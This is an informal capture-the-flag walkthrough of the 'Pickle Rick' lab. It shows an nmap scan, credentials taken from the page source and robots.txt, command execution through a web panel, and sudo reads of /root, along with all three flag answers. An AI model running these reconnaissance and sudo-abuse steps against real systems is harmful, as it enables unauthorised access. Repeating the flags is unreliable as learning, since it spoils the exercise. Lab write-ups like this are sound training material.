root@debian:/home/mao/Documents# nmap -sV -sC -p- -T4 10.130.129.91
Starting Nmap 7.93 ( https://nmap.org ) at 2026-09-27 11:17 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Title : Pickle Rick
Author : N0ctus
severity : critical

The password is stocked in robots.txt


nmap -sV -sC -p- -T4 10.130.129.91

Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 63.72% done; ETC: 11:18 (0:00:23 remaining)
Nmap scan report for 10.130.129.91
Host is up (0.064s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8678c248d84ecf65c360d1e1a547b2d (RSA)
|   256 6d733fb0f003f36e15172e34c1c6cb94 (ECDSA)
|_  256 007415be900ad8906a42b8ac99fbe7d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.60 seconds

I go to the website "http://10.130.129.91/" and I go to see source code with CTRL + U 
I have my first vulnerabilities ! the username is stocked on the source code "Note to self, remember username!

    Username: R1ckRul3s"


I start enumeration with dirb ! 
I found /assets, /robots.txt and /login.php ! Like I have the username I put the usernames on login.php ! 
On /assets this is a file arboresence like the jpg file, gif file etc...
and on robots.txt I have a text : "Wubbalubbadubdub" I test wich password and... success !
I tape ls in the panel control 
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

okay nice I have the first flag ;) 
I tape less "Sup3rS3cretPickl3Ingred.txt" and In the output I have mr. meeseek hair.
Like I'm www-data and www-data is root, I tape in the command panel "sudo ls -la /root"
BINGO I have a other flag :) 
total 36
drwx------  4 root root 4096 Jul 11  2024 .
drwxr-xr-x 23 root root 4096 Sep 27 09:16 ..
-rw-------  1 root root  168 Jul 11  2024 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
drwx------  2 root root 4096 Feb 10  2019 .ssh
-rw-------  1 root root  702 Jul 11  2024 .viminfo
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x  4 root root 4096 Jul 11  2024 snap

so I tape sudo less /root/3rd.txt and I have the 3rd ingredients ! "3rd ingredients: fleeb juice"
I go to the /home/rick and I see "second ingredients" so I taping less "/home/rick/second ingredients"
and I have the last flag ! 1 jerry tear


